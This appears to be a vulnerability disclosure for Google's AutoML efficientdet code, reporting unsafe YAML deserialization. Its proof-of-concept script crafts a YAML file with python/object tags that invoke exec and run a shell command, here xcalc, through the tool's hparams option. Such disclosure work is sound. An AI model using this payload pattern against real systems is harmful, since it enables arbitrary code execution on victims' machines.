## ✍️ Description
Google Automl repository contains a list of AutoML related models and libraries.
* **Vulnerability discription**
Vulnerable to yaml deserilisation attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
```python
# exploit.py
import os
os.chdir('automl/efficientdet/')
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('rm exploit.yaml')
open('exploit.yaml','w+').write(exploit)
cmd = str("""python model_inspect.py --runmode=saved_model --model_name=efficientdet-d0 --ckpt_path=efficientdet-d0 --saved_model_dir=savedmodeldir --tensorrt=FP32  --tflite_path=efficientdet-d0.tflite --hparams=exploit.yaml""")
os.system(cmd)
```
* run the exploit.py file
![](https://cdn.discordapp.com/attachments/789769803770494996/791679209386147870/Screenshot_from_2020-12-24_20-15-52.png)
